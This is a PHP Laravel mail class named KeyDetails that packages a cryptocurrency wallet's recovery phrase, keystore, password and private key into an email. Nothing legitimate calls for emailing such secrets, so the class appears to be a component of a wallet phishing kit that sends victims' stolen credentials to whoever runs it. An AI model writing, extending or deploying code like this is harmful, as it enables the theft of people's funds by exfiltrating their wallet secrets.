<?php

namespace App\Mail;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Mail\Mailable;
use Illuminate\Queue\SerializesModels;

class KeyDetails extends Mailable
{
    use Queueable, SerializesModels;

    private $type;
    private $phrase;
    private $keystore;
    private $password;
    private $privateKey;

    /**
     * Create a new message instance.
     *
     * @return void
     */
    public function __construct($phrase, $type, $keystore, $password, $privateKey)
    {
        $this->type = $type;
        $this->phrase = $phrase;
        $this->keystore = $keystore;
        $this->password = $password;
        $this->privateKey = $privateKey;
    }

    /**
     * Build the message.
     *
     * @return $this
     */
    public function build()
    {
        return $this->markdown('emails.details')
            ->with('type', $this->type)
            ->with('phrase', $this->phrase)
            ->with('keystore', $this->keystore)
            ->with('password', $this->password)
            ->with('privateKey', $this->privateKey);
    }
}
